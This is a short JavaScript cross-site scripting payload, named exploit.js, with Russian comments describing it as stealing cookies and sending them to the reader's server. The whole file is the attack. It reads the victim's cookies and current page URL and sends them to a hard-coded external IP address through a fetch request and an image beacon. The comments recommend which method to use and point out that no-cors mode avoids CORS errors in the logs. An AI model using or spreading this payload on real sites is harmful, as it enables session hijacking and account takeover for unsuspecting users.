// exploit.js — крадёт куки и отправляет на твой сервер

(function() {
    const cookies = document.cookie;
    const exfilUrl = 'http://109.234.39.144:8889/steal?cookie=' + 
                     encodeURIComponent(cookies) + 
                     '&location=' + encodeURIComponent(document.location.href);

    // Способ 1: fetch (рекомендую)
    fetch(exfilUrl, {
        method: 'GET',
        mode: 'no-cors'        // чтобы не было ошибок CORS в логах
    }).catch(() => {});

    // Способ 2: Image beacon (работает почти всегда)
    const img = new Image();
    img.src = exfilUrl;

    // Опционально: можно отправить и другие данные
    console.log('%c[XSS] Cookies exfiltrated!', 'color:red;font-size:20px');
})();